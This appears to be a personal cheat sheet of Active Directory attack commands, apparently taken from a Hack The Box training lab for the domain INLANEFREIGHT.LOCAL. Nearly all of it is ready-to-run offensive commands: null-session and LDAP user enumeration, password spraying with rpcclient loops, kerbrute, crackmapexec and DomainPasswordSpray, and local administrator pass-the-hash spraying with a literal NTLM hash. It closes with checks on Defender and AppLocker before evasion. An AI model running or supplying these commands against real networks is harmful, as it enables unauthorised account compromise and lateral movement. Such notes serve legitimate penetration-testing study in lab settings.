Finding active host within domain
```shell-session
fping -asgq 172.16.5.0/23
```

Finding NULL Sessions

```shell-session
rpcclient -U "" -N 172.16.5.5
```

Password policy
```shell-session
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
```

```shell-session
crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol
```

Generating user account list
https://github.com/insidetrust/statistically-likely-usernames

Discovering valid users
```shell-session
enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
```
```shell-session
crackmapexec smb 172.16.5.5 --users
```
```shell-session
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "
```

Password spraying linux

```shell-session
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
```
```shell-session
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1
```
```shell-session
sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
```

Password spraying windows 
	https://github.com/dafthack/DomainPasswordSpray
```powershell-session
PS C:\htb> Import-Module .\DomainPasswordSpray.ps1
PS C:\htb> Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```


Admin account hash spraying
```shell-session
sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
```

Discovering valid users with user list
```shell-session
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt

(Extract usernames)

grep -oE '[^[:space:]]+@' logfile.txt | cut -d'@' -f1
```

Get common user attributes
```powershell-session
Get-ADUser -Identity htb-student
```

Group Details
```powershell-session
Get-ADGroup -Identity "Server Operators" -Properties *
```

Current User Privileges
```powershell-session
whoami /priv
```


***Security Controls***

Check Windows Devender
```powershell-session
Get-MpComputerStatus
```

Check Whitelist applications and paths
```powershell-session
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```
